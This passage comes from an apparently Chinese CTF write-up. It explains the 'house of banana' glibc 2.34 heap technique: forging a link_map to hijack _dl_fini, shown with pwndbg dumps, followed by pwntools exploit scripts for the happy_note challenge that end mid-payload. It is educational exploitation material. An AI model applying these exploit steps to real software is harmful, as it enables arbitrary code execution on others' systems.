class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_dl_fini (void)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">   struct link_map *maps[nloaded];    </span><br><span class="line"></span><br><span class="line">   unsigned int i;</span><br><span class="line">   struct link_map *l;</span><br><span class="line">   assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);</span><br><span class="line">   for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)</span><br><span class="line">     /* Do not handle ld.so in secondary namespaces.  */</span><br><span class="line">     if (l == l-&gt;l_real)      //检查节点的地址是否跟自己结构体保存的一致</span><br><span class="line">       &#123;</span><br><span class="line">  assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">  maps[i] = l;</span><br><span class="line">  l-&gt;l_idx = i;</span><br><span class="line">  ++i;</span><br><span class="line"></span><br><span class="line">  /* Bump l_direct_opencount of all objects so that they</span><br><span class="line">     are not dlclose()ed from underneath us.  */</span><br><span class="line">  ++l-&gt;l_direct_opencount;</span><br><span class="line">       &#125;</span><br><span class="line">   assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">   assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);</span><br><span class="line">   unsigned int nmaps = i;</span><br><span class="line"></span><br><span class="line">   _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line">    NULL, true);</span><br><span class="line"></span><br><span class="line">   __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">   for (i = 0; i &lt; nmaps; ++i)</span><br><span class="line">     &#123;</span><br><span class="line">       struct link_map *l = maps[i];   //l遍历link_map的链表</span><br><span class="line"></span><br><span class="line">       if (l-&gt;l_init_called)     //重要的检查点</span><br><span class="line">  &#123;</span><br><span class="line">    l-&gt;l_init_called = 0;      </span><br><span class="line"></span><br><span class="line">    /* Is there a destructor function?  */</span><br><span class="line">    if (l-&gt;l_info[DT_FINI_ARRAY] != NULL</span><br><span class="line">        || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != NULL))</span><br><span class="line">      &#123;</span><br><span class="line">        /* When debugging print a message first.  */</span><br><span class="line">        if (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">         &amp; DL_DEBUG_IMPCALLS, 0))</span><br><span class="line">   _dl_debug_printf (&quot;\ncalling fini: %s [%lu]\n\n&quot;,</span><br><span class="line">       DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">       ns);</span><br><span class="line"></span><br><span class="line">        /* First see whether an array is given.  */</span><br><span class="line">        if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</span><br><span class="line">   &#123;</span><br><span class="line">     ElfW(Addr) *array =</span><br><span class="line">       (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">         + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">     unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">         / sizeof (ElfW(Addr)));</span><br><span class="line">     while (i-- &gt; 0)</span><br><span class="line">       ((fini_t) array[i]) ();     //目标位置</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>总结下我们需要绕过那些检查</p>
+<ol>
+<li><p>判断_ns_loaded链表中至少有三个节点（dl-fini开始部分通过循环遍历链表，做检查，）</p>
+</li>
+<li><p>检查l == l-&gt;l_real</p>
+</li>
+<li><p>检查l == l-&gt;l_real检查l-&gt;l_init_called &gt; 8 这个其实跟数据的处理有关</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">unsigned int l_relocated:1; /* Nonzero if object&#x27;s relocations done.  */</span><br><span class="line">    unsigned int l_init_called:1; /* Nonzero if DT_INIT function called.  */</span><br><span class="line">    unsigned int l_global:1; /* Nonzero if object in _dl_global_scope.  */</span><br><span class="line">    unsigned int l_reserved:2; /* Reserved for internal use.  */</span><br><span class="line">    unsigned int l_phdr_allocated:1; /* Nonzero if the data structure pointed</span><br><span class="line">     to by `l_phdr&#x27; is allocated.  */</span><br><span class="line">    unsigned int l_soname_added:1; /* Nonzero if the SONAME is for sure in</span><br></pre></td></tr></table></figure>
+
+<p>在link_map结构体中，这个变量是4字节，与结构体开始位置的偏移量为0x31c。pwndbg帮我们解释了数据的结果，这里的数据要大于8，我们不妨之际设置为9.不同节点可以有所差异，下面是一个结果为1 的数据</p>
+<p><img data-src="https://pic2.zhimg.com/80/v2-edd4f01f64289f36b526d0b187334955_1440w.png" alt="img"></p>
+<p>以及一个不为1 的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct link_map *)0x7f56e43ba7d0</span><br><span class="line">$5 = &#123;</span><br><span class="line">  l_addr = 140725148598272,</span><br><span class="line">  l_name = 0x7ffd207e4371 &quot;linux-vdso.so.1&quot;,</span><br><span class="line">  l_ld = 0x7ffd207e43e0,</span><br><span class="line">  l_next = 0x7f56e4382000,</span><br><span class="line">  l_prev = 0x7f56e43ba220,</span><br><span class="line">  l_real = 0x7f56e43ba7d0,</span><br><span class="line">...</span><br><span class="line">  l_relocated = 1,</span><br><span class="line">  l_init_called = 0,</span><br><span class="line">  l_global = 0,</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; x/wx 0x7f56e43ba7d0+0x31c</span><br><span class="line">0x7f56e43baaec: 0x00000005</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
+
+<p>\4.  检查l-&gt;l_info[DT_FINI_ARRAY] != NULL，unsigned int i =  (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_valDT_FINI_ARRAY宏定义为26，DT_FINI_ARRAYSZ宏定义为28，所以l_info[26],以及l_info[28]不能是null(28是因为i会影响到函数  ((fini_t) array[i]) ();调用)</p>
+<p>下面我们具体说说如何伪造，我选择利用修改第三节点的l_next指针，指向一个chunk,并在chunk上部署我们伪造的link_map.这里依赖任意地址写，可通过largebin   attack实现，或者其他漏洞造成的可以任意地址写堆地址。第三节点的指针在哪？_rtld_global符号并不在libc文件，而是在ld.so文件中，我们要泄露出程序的ld基址，pwndbg为我们提供了一个函数求偏移量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line">0x7f56e43b9040-&gt;0x7f56e4382018 is -0x37028 bytes (-0x6e05 words)</span><br></pre></td></tr></table></figure>
+
+<p>由此我们就知道了需要向哪里写入chunk.</p>
+<p>接下来就是重点，我们如何伪造link_map.</p>
+<p>因为原来的链表中只有4个节点，而我们伪造的link_map有恰是第四个，所以，l_next就是0，l_prve无所谓，直接写0即可。l_real就是我们的伪造的link_map的开始地址，也是我们修改后的第三节点的l_next的值。这几个值离link_map的首地址很近，可以很直接的看出偏移量。接下来就是l_info的伪造。l_info[26]不为0，这是结构体内的数组，distance可以得到info[26]  info[28]关于节点地址的偏移量，同样我们可以得到上面提到的l_init_called的偏移量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_info[26]</span><br><span class="line">0x7f56e43ba220-&gt;0x7f56e43ba330 is 0x110 bytes (0x22 words)</span><br><span class="line">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_info[28]</span><br><span class="line">0x7f56e43ba220-&gt;0x7f56e43ba340 is 0x120 bytes (0x24 words)</span><br><span class="line">pwndbg&gt; distance _rtld_global._dl_ns._ns_loaded &amp;_rtld_global._dl_ns._ns_loaded-&gt;l_init_called</span><br><span class="line">0x7f56e43ba220-&gt;0x7f56e43ba53c is 0x31c bytes (0x63 words)</span><br></pre></td></tr></table></figure>
+
+<p>重点来了，info这连个位置我们写入什么数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">l_info = &#123;0x0, 0x41, 0x0, 0x55a656f072f8, 0x8, 0x7f56e4244cec &lt;__execvpe+652&gt;, 0xa, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x55a656f072e0, 0x0, 0x55a656f072e8, 0xa, 0x0, 0x41, 0x9, 0xa, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x0, 0x0&#125;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">  if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</span><br><span class="line">   &#123;</span><br><span class="line">     ElfW(Addr) *array =</span><br><span class="line">       (ElfW(Addr) *) (l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">     unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val/ sizeof (ElfW(Addr)));</span><br><span class="line">     while (i-- &gt; 0)</span><br><span class="line">       ((fini_t) array[i]) ();     //目标位置</span><br></pre></td></tr></table></figure>
+
+<p>这是一个比较通用的info，0x7f56e4244cec &lt;__execvpe+652&gt;是我们想要执行的函数。</p>
+<p>我们再看源码的相关部分，正常情况下，exit使用的就是第四个节点的l_info的数据，也就是使用我们伪造的info。</p>
+<p>sizeof  (ElfW(Addr)) = 8，为了方便解释，我们将这里  l-&gt;l_info[DT_FINI_ARRAYSZ]的数据记为ptr，ptr-&gt;d_un.d_ptr,其实就是ptr+0x8所指向的数据。ptr是我们要伪造的数据，他是堆中的一个可控制的位置。我们想要执行一次就可以获得shell，我们不妨让i  =1,然后我们需要在ptr+8的位置写入的就是1*8=8</p>
+<p>我们还要确定的是arry数组。(l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</p>
+<p>l-&gt;addr其实就是我们伪造的link_map开始的位置，个人喜欢将这里写为0，然后将l_info[26]写入另外一个地址，两者加起来就是数组的初始位置。我们记录这个地址为ptr_a,这个就会给arry赋值，然后  arry[i] ====&gt;&gt; 就是调用ptr_a +8*i 位置的函数。也就是我们的后门。</p>
+<p>提供一个构造的布局，</p>
+<p>在fake+0x110写入一个ptr_a，且ptr_a+0x8处有ptr，ptr处写入的是最后要执行的函数地址.</p>
+<p>在fake+0x120写入一个ptr，且ptr+0x8处是i*8。</p>
+<p>我选择的是fake+0x110写入fake+0x40，在fake+0x48写入fake+0x58，在fake+0x58写入shell</p>
+<p>我选择在fake+0x120写入fake+0x48，在fake+0x50处写入8.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tel 0x55a656f072a0(fake) 40</span><br><span class="line">00:0000│  0x55a656f072a0 ◂— 0x0       //l_addr</span><br><span class="line">... ↓     4 skipped</span><br><span class="line">05:0028│  0x55a656f072c8 —▸ 0x55a656f072a0 ◂— 0x0    //l_real</span><br><span class="line">06:0030│  0x55a656f072d0 ◂— 0x0</span><br><span class="line">07:0038│  0x55a656f072d8 ◂— 0x41 </span><br><span class="line">08:0040│  0x55a656f072e0 ◂— 0x0</span><br><span class="line">09:0048│  0x55a656f072e8 —▸ 0x55a656f072f8 —▸ 0x7f56e4244cec (execvpe+652) ◂— mov    rdx, r12</span><br><span class="line">0a:0050│  0x55a656f072f0 ◂— 0x8</span><br><span class="line">0b:0058│  0x55a656f072f8 —▸ 0x7f56e4244cec (execvpe+652) ◂— mov    rdx, r12</span><br><span class="line">0c:0060│  0x55a656f07300 ◂— 0xa /</span><br><span class="line">0d:0068│  0x55a656f07308 ◂— 0x0</span><br><span class="line">0e:0070│  0x55a656f07310 ◂— 0x0</span><br><span class="line">0f:0078│  0x55a656f07318 ◂— 0x41</span><br><span class="line">10:0080│  0x55a656f07320 ◂— 0x0</span><br><span class="line">... ↓     6 skipped</span><br><span class="line">17:00b8│  0x55a656f07358 ◂— 0x41</span><br><span class="line">18:00c0│  0x55a656f07360 ◂— 0x0</span><br><span class="line">... ↓     6 skipped</span><br><span class="line">1f:00f8│  0x55a656f07398 ◂— 0x41 </span><br><span class="line">20:0100│  0x55a656f073a0 ◂— 0x0</span><br><span class="line">21:0108│  0x55a656f073a8 ◂— 0x0</span><br><span class="line">22:0110│  0x55a656f073b0 —▸ 0x55a656f072e0  //l_info[26]</span><br><span class="line">23:0118│  0x55a656f073b8 ◂— 0x0</span><br><span class="line">24:0120│  0x55a656f073c0 —▸ 0x55a656f072e8  //l_info[28]</span><br><span class="line">25:0128│  0x55a656f073c8 ◂— 0xa </span><br><span class="line">26:0130│  0x55a656f073d0 ◂— 0x0</span><br><span class="line">27:0138│  0x55a656f073d8 ◂— 0x41</span><br></pre></td></tr></table></figure>
+
+<p>最后我们就是利用onegadget获得shell了。</p>
+<p>利用gdb万能必挂点，结合one_gadget工具帮助我们快速找到合适的one_gadget</p>
+<p><img data-src="https://pic3.zhimg.com/80/v2-8e71d13c972fd006acc5279d28cf2ba2_1440w.jpg" alt="img"></p>
+<h2 id="一些注意点："><a href="#一些注意点：" class="headerlink" title="一些注意点："></a>一些注意点：</h2><p>因为_rtld_global   这个符号是存在与ld.so文件中，往往出题人不会给出ld.so文件，rtld_global_ptr与libc_base的偏移在本地与远程并不是固定的，可能会在地址的第2字节处发生变化，因此可以爆破256种可能得到远程环境的精确偏移。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文主要就是介绍我们常用的手法，在高版本的利用情况，主要关注的是在较新版本  Glibc-2.34  0ubuntu3.2的可行性。因为2.34主要问题还是在于一些hook函数被禁止，以及对_IO_str_finish、_IO_str_overflow变化的影响，导致我们可以利用的点是在是很少了。但是这其实对于各位ctfer来讲，因为方法很少，导致攻击手法比较的单一，只有那么几个可以使用。在3.2版本之前，我们依旧可以通过修改vtable劫持控制流，或者攻击’exit_hook’(这个叫法可能会不太严谨，因为并不是一个hook的符号，而是其他的符号)。house  of kiwi,攻击exit_hook依旧是可以实现，且比较方便的。</p>
+<p>后面我这里主要介绍了house of banana,这项技术，依旧是用于3.2，并且向下兼容。简要概括，就是修改第三个节点的l_next为堆地址fake，并在该堆上伪造第四个节点。</p>
+<p>伪造link_map</p>
+<ol>
+<li>*(fake+0x28)=fake。</li>
+<li>*(fake +0x48)=fake+0x58, *(fake+0x50) = 0x8</li>
+<li>*(fake+0x58) = shell</li>
+<li>*(fake+0x110) = fake+0x40</li>
+<li>*(fake+0x120) = fake+0x48</li>
+<li>(int)*(fake+0x31c) = 0x9</li>
+</ol>
+<h1 id="例题：巅峰极客2022-happy-note"><a href="#例题：巅峰极客2022-happy-note" class="headerlink" title="例题：巅峰极客2022-happy_note"></a>例题：巅峰极客2022-happy_note</h1><p>程序存在一个可以利用一次的uaf漏洞，对堆大小和数量没有太大限制，所以可以利用常规手法泄露出libcbase和heapbase</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./happy_note&#x27;)</span><br><span class="line">#libc = ELF(&#x27;/home/youlin/tools/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6&#x27;)</span><br><span class="line">libc=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    io.recvuntil(b&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def add(idx,size,choice):</span><br><span class="line">    menu(1)</span><br><span class="line">    io.recvuntil(b&quot;Note size:&quot;)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b&quot;Choose a mode: [1] or [2]&quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    menu(4)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b&quot;Edit your content:&quot;)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    io.recvuntil(b&quot;Which one do you want to show?&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def UAF(idx):</span><br><span class="line">    menu(666)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(9):#0-8</span><br><span class="line">    add(i,0x200,1)</span><br><span class="line"></span><br><span class="line">for i in range(7):#0-6</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">UAF(7)#7</span><br><span class="line">show(7)</span><br><span class="line">libcbase = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))-0x219cc0</span><br><span class="line">rtld = libcbase + 0x25f040</span><br><span class="line">setcontext = libcbase + libc.sym[&#x27;setcontext&#x27;] + 61</span><br><span class="line">sys_addr = libcbase + libc.sym[&#x27;system&#x27;]</span><br><span class="line">sh = libcbase + libc.search(b&#x27;/bin/sh&#x27;).__next__()</span><br><span class="line">ret = libcbase + 0x28a87</span><br><span class="line">l_next = libcbase + 0x228010</span><br><span class="line">padding = libcbase + 0x218bc0</span><br><span class="line">pop_rdi = libcbase + 0x2a6c5</span><br><span class="line">add(0,0x10,1)#0</span><br><span class="line">add(1,0x1e0,1)#1</span><br><span class="line">add(2,0x1e0,1)#2</span><br><span class="line">add(3,0x1e0,1)#3</span><br><span class="line">delete(0)</span><br><span class="line">show(7)</span><br><span class="line">io.recvuntil(b&#x27;content: &#x27;)</span><br><span class="line">key = u64(io.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(8,b&#x27;\0&#x27;))-1</span><br><span class="line">heapbase = key&lt;&lt;12</span><br><span class="line">fake_rtld = heapbase + 0x1120</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后就是一个house of banana攻击</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./happy_note&#x27;)</span><br><span class="line">#libc = ELF(&#x27;/home/youlin/tools/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6&#x27;)</span><br><span class="line">libc=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    io.recvuntil(b&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def add(idx,size,choice):</span><br><span class="line">    menu(1)</span><br><span class="line">    io.recvuntil(b&quot;Note size:&quot;)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b&quot;Choose a mode: [1] or [2]&quot;)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    menu(2)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    menu(4)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(b&quot;Edit your content:&quot;)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    menu(3)</span><br><span class="line">    io.recvuntil(b&quot;Which one do you want to show?&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def UAF(idx):</span><br><span class="line">    menu(666)</span><br><span class="line">    io.recvuntil(b&quot;Choose a note:&quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">for i in range(9):#0-8</span><br><span class="line">    add(i,0x200,1)</span><br><span class="line"></span><br><span class="line">for i in range(7):#0-6</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">UAF(7)#7</span><br><span class="line">show(7)</span><br><span class="line">libcbase = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))-0x219cc0</span><br><span class="line">rtld = libcbase + 0x25f040</span><br><span class="line">setcontext = libcbase + libc.sym[&#x27;setcontext&#x27;] + 61</span><br><span class="line">sys_addr = libcbase + libc.sym[&#x27;system&#x27;]</span><br><span class="line">sh = libcbase + libc.search(b&#x27;/bin/sh&#x27;).__next__()</span><br><span class="line">ret = libcbase + 0x28a87</span><br><span class="line">l_next = libcbase + 0x228010</span><br><span class="line">padding = libcbase + 0x218bc0</span><br><span class="line">pop_rdi = libcbase + 0x2a6c5</span><br><span class="line">add(0,0x10,1)#0</span><br><span class="line">add(1,0x1e0,1)#1</span><br><span class="line">add(2,0x1e0,1)#2</span><br><span class="line">add(3,0x1e0,1)#3</span><br><span class="line">delete(0)</span><br><span class="line">show(7)</span><br><span class="line">io.recvuntil(b&#x27;content: &#x27;)</span><br><span class="line">key = u64(io.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(8,b&#x27;\0&#x27;))-1</span><br><span class="line">heapbase = key&lt;&lt;12</span><br><span class="line">fake_rtld = heapbase + 0x1120</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">edit(7,b&#x27;a&#x27; * 0x10 + p64(0) + p64(0x1f1) + p64(l_next ^ (key + 1)))</span><br><span class="line">add(4,0x1e8,2)</span><br><span class="line">add(5,0x1e8,2)</span><br><span class="line">edit(5,p64(padding) + p64(fake_rtld))</span><br><span class="line"></span><br><span class="line">one = [0xeacec, 0xeacef, 0xeacf2]</span><br><span class="line"></span><br><span class="line">ogg = libcbase + one[0]</span><br><span class="line"></span><br><span class="line">payload = b&#x27;\x00&#x27; * 0x18</span><br><span class="line">payload += p64(fake_rtld)</span><br><span class="line">payload = payload.ljust(0x38, 